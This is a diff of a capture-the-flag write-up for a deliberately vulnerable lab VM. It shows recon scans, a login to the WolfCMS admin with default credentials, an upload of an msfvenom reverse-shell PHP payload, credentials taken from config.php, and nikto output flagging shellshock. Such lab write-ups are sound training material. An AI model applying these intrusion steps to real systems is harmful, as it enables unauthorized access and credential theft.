@@ -1,7 +1,7 @@
 # INTRO
 This is my first machine (thats being uploaded). This machine emulates OSCP labs with the objective being to compromise the machine and gain root privileges.
 
-# RECON
+# RECON AND ENUM
 Using netdiscover I found the local ip of the machine and proceeded to run an nmap scan.
 ```
 └─# nmap -A -sC -sV -Pn 192.168.1.152
@@ -77,7 +77,9 @@ User-agent: *
 Disallow: /
 Dissalow: /wolfcms
 ```
-http://192.168.1.152/wolfcms directs to the CMS with nothing special on the page. I tried entering /admin and /login to get to a login page but with no success I searched up the admin page directory for wolfcms and found http://192.168.152/?/admin. Trying to capture the network reqeust I entered the standard credentials admin:admin and I got logged in.
+http://192.168.1.152/wolfcms directs to the CMS with nothing special on the page. I tried entering /admin and /login to get to a login page but with no success I searched up the admin page directory for wolfcms and found http://192.168.152/?/admin. Trying to capture the network reqeust I entered the standard credentials admin:admin and I got access.
+
+# EXPLOITATION
 
 I browsed further and came across the file manager and uploaded a reverse tcp meterpreter payload I generated using msfvenom to /public and connected to it with a listener from msfconsole.
 ```
@@ -89,6 +91,9 @@ Payload size: 1114 bytes
 Saved as: shell.php
 ```
 After gaining a meterpreter session I found a config.php file and I cat the contents out to find credentials.
+
+# PRIVILEGE ESCALATION
+
 ```
 // Database settings:
 define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
@@ -155,4 +160,32 @@ Thanks for Trying
 
 root@SickOs:~# 
 ```
-
+There is also another path to root with a shellshock CVE, a nikto scan shows us this.
+```
+└─# nikto -h 192.168.1.152 --useproxy 192.168.1.152:3128
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.1.152
++ Target Hostname:    192.168.1.152
++ Target Port:        80
++ Proxy:              192.168.1.152:3128
++ Start Time:         2023-01-01 23:35:22 (GMT4)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.22 (Ubuntu)
++ Retrieved via header: 1.0 localhost (squid/3.1.19)
++ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header 'x-cache-lookup' found, with contents: MISS from localhost:3128
++ Uncommon header 'x-cache' found, with contents: MISS from localhost
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Server may leak inodes via ETags, header found with file /robots.txt, inode: 265381, size: 45, mtime: Sat Dec  5 04:35:02 2015
++ Uncommon header 'tcn' found, with contents: list
++ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
++ Server banner has changed from 'Apache/2.2.22 (Ubuntu)' to 'squid/3.1.19' which may suggest a WAF, load balancer or proxy is in place
++ Uncommon header 'x-squid-error' found, with contents: ERR_INVALID_URL 0
++ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Uncommon header '93e4r0-cve-2014-6278' found, with contents: true
++ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+```
